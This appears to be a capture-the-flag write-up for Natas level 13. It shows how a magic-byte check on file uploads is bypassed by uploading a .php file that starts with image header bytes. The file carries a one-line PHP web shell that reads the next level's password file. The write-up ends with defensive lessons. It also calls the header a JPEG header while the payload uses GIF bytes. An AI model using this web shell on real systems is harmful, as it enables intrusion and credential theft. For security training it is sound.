# Natas Level 13 - File Upload Validation Bypass (Magic Bytes)

## Vulnerability Type
- File Upload
- Server-side validation bypass
- Magic bytes bypass

## Source Code Analysis
- exif_imagetype() checks the magic bytes of the file
- it does NOT validate file extension
- if the file begins with valid JPEG header(FFD8FF),it will pass vaildation

So 

## Exploitation Steps
1,create PHP web shell (and add JPEG magic bytes)
```
GIF89a<?php system("cat /etc/natas_webpass/natas14"); ?>
```
2,upload the file (keep extension as .php)

3,access uploaded file

## Result
successfully bypassed image validation and retrieved next level pass word.

## Security Insight
- Magic byte checking alone is insufficient.
- File extension and content validation must both be enforced.
- Updoaded files should not be executable.
